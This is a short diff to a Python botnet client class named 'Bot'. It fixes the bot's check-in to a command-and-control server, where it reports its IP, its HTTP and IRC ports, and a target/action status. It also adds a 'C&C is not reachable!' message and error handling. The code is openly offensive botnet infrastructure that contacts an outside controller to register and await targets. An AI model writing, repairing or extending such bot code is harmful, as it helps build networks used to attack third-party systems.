@@ -53,7 +53,10 @@ class Bot:
     ircPort = 6667
 
     def __init__(self):
-        self.sendInfo()
+        res = self.sendInfo()
+        if not res:
+            print("C&C is not reachable!")
+            return
         task = []
         with ThreadPoolExecutor(max_workers=2) as exec:
             task.append(exec.submit(self.httpServer))
@@ -64,8 +67,8 @@ class Bot:
     def sendInfo(self):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.myIp = s.getsockname()[0]
             s.connect((self.host, self.port))
+            self.myIp = s.getsockname()[0]
             message = self.myIp + ' {"http":' + str(self.httpPort) + ',"irc":' + str(
                 self.ircPort) + ',"target":"-","action":"waiting"}'
             while message != 'bot registrated succesfully':
@@ -74,6 +77,7 @@ class Bot:
             s.close()
         except Exception as e:
             print("Information send error: ", e)
+            return False
         finally:
             s.close()
 
